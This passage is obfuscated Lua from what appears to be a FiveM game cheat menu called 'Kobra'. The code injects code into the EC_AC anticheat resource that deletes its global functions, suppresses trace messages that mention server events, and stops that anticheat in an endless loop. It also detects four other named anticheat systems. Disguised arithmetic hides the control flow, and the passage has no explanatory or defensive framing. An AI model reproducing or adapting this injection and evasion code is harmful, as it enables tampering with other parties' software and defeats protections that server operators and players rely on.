                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v995=1839 -(286 + 1552) ;end if (v995==1) then v996={"EC_AC"};for v1198=1321 -(708 + 612) , #v996 do local v1199=v996[v1198];MachoInjectResource(v1199,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(1050);end v995=5 -3 ;end if (v995==2) then CreateThread(function() while true do local v1304=0;while true do if (v1304==0) then Wait(0 + 0 );MachoResourceStop("EC_AC");break;end end end end);break;end end end if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",3379 -(113 + 266) );elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",4170 -(979 + 191) );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",5317 -2317 );elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",3000);end end;
